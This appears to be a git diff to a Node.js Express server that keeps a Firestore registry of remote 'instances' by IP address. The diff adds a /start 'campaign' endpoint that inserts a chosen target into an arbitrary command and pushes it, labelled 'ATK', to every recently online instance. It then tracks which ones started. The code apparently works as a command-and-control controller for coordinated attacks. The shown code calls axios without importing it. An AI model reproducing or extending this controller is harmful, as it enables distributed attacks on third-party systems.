@@ -1,17 +1,20 @@
 const express = require('express');
-const admin = require('firebase-admin');
 const app = express();
+const { admin } = require('./db');
+require('./cronJob');
 
-// Initialize Firebase Admin
-const serviceAccount = require('./d-project-firebase-adminsdk.json');
-const { parseOutput } = require('./util');
-admin.initializeApp({
-    credential: admin.credential.cert(serviceAccount)
-});
-
+const { parseOutput, formatIpAddress } = require('./util');
 const db = admin.firestore();
+const cors = require('cors');
 const instancesCollection = db.collection('instances');
 const targetLogsCollection = db.collection('target-logs');
+const campaignsCollection = db.collection('campaigns');
+
+app.use(cors({
+    origin: ['http://localhost:5173'],
+    methods: ['GET', 'POST'],
+    credentials: true
+}));
 
 // Middleware to parse JSON bodies
 app.use(express.json());
@@ -20,7 +23,7 @@ app.use(express.json());
 app.post('/connect', async (req, res) => {
     try {
         // Get IP address from request
-        const ipAddress = req.ip || req.connection.remoteAddress;
+        const ipAddress = formatIpAddress(req.ip || req.connection.remoteAddress);
 
         // Generate unique instance ID if not provided
         const instanceId = req.body.instanceId || Date.now().toString();
@@ -115,6 +118,138 @@ app.post('/update', async (req, res) => {
         });
     }
 });
+
+// Start campaign endpoint
+app.post('/start', async (req, res) => {
+    try {
+        const { command, target } = req.body;
+
+        if (!command || !target) {
+            return res.status(400).json({
+                status: 'error',
+                message: 'Command and target are required'
+            });
+        }
+
+        // Create campaign document
+        const campaignData = {
+            command,
+            target,
+            status: 'running',
+            startTime: admin.firestore.FieldValue.serverTimestamp(),
+            instances: []
+        };
+
+        // Add campaign to database
+        const campaignRef = await campaignsCollection.add(campaignData);
+
+        // Get all online instances
+        const instancesSnapshot = await instancesCollection
+            .where('status', '==', 'online')
+            .where('lastSeen', '>', Date.now() - 60000) // Only instances seen in last minute
+            .get();
+
+        if (instancesSnapshot.empty) {
+            await campaignsCollection.doc(campaignRef.id).update({
+                status: 'failed',
+                error: 'No online instances available'
+            });
+
+            return res.status(400).json({
+                status: 'error',
+                message: 'No online instances available'
+            });
+        }
+
+        // Prepare command with target inserted
+        const finalCommand = command.replace('{target}', target);
+
+        // Send command to all online instances
+        const sendPromises = instancesSnapshot.docs.map(async (doc) => {
+            const instance = doc.data();
+            const instanceIp = instance.ipAddress;
+            
+            try {
+                // Send command to instance
+                await axios.post(`http://${instanceIp}:3001/command`, {
+                    action: 'start',
+                    processId: 'ATK',
+                    command: finalCommand
+                });
+
+                // Add instance to campaign's instances array
+                await campaignsCollection.doc(campaignRef.id).update({
+                    instances: admin.firestore.FieldValue.arrayUnion({
+                        instanceId: doc.id,
+                        ipAddress: instanceIp,
+                        status: 'running'
+                    })
+                });
+
+                return {
+                    instanceId: doc.id,
+                    status: 'success'
+                };
+            } catch (error) {
+                console.error(`Failed to send command to instance ${doc.id}:`, error);
+                
+                // Add failed instance to campaign's instances array
+                await campaignsCollection.doc(campaignRef.id).update({
+                    instances: admin.firestore.FieldValue.arrayUnion({
+                        instanceId: doc.id,
+                        ipAddress: instanceIp,
+                        status: 'failed',
+                        error: error.message
+                    })
+                });
+
+                return {
+                    instanceId: doc.id,
+                    status: 'failed',
+                    error: error.message
+                };
+            }
+        });
+
+        // Wait for all instances to receive commands
+        const results = await Promise.all(sendPromises);
+
+        // Check if any instances succeeded
+        const successfulInstances = results.filter(r => r.status === 'success').length;
+        
+        if (successfulInstances === 0) {
+            await campaignsCollection.doc(campaignRef.id).update({
+                status: 'failed',
+                error: 'Failed to start campaign on any instance'
+            });
+
+            return res.status(500).json({
+                status: 'error',
+                message: 'Failed to start campaign on any instance',
+                results
+            });
+        }
+
+        res.status(200).json({
+            status: 'success',
+            message: 'Campaign started successfully',
+            campaignId: campaignRef.id,
+            totalInstances: results.length,
+            successfulInstances,
+            failedInstances: results.length - successfulInstances,
+            results
+        });
+
+    } catch (error) {
+        console.error('Error starting campaign:', error);
+        res.status(500).json({
+            status: 'error',
+            message: 'Failed to start campaign',
+            error: error.message
+        });
+    }
+});
+
 // Start server
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
